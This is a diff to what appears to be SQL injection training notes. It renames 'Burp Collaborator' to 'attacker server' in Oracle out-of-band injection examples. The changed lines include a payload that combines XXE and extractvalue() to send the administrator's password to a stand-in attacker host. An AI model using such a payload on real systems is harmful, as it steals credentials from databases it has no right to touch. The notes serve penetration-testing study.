@@ -434,7 +434,7 @@
 * Here we are using a method called extractvalue(), that takes in a XML type instance and XPath expression(this argument doesn't matter much it just needs to be there to execute correctly).
 
 
-* An XXE payload using a parameter entity called remote is used, that will reach out to our Burp Collaborator.
+* An XXE payload using a parameter entity called remote is used, that will reach out to our attacker server.
 
     * Oracle DB:
 
@@ -463,7 +463,7 @@ FROM dual--
 * Here we are using a method called extractvalue(), that takes in a XML type instance and XPath expression(this argument doesn't matter much it just needs to be there to execute correctly).
 
 
-* An XXE payload using a parameter entity called remote is used, that will reach out to our Burp Collaborator.  The application will evaluate the SQL query before the XXE payload is executed.
+* An XXE payload using a parameter entity called remote is used, that will reach out to our attacker server.  The application will evaluate the SQL query before the XXE payload is executed.
 
 
     * Oracle DB:
@@ -480,7 +480,7 @@ FROM dual--
 xmltype('
 <?xml version="1.0" encoding="UTF-8"?>
 <!DOCTYPE root [ 
-<!ENTITY % remote SYSTEM "http://'||(select password from users where username = 'administrator')||'.BURP-COLLABORATOR-DOMAIN/"> %remote;]>
+<!ENTITY % remote SYSTEM "http://'||(select password from users where username = 'administrator')||'.ATTACKER-SERVER/"> %remote;]>
 ')
 ,'/1') 
 FROM dual--
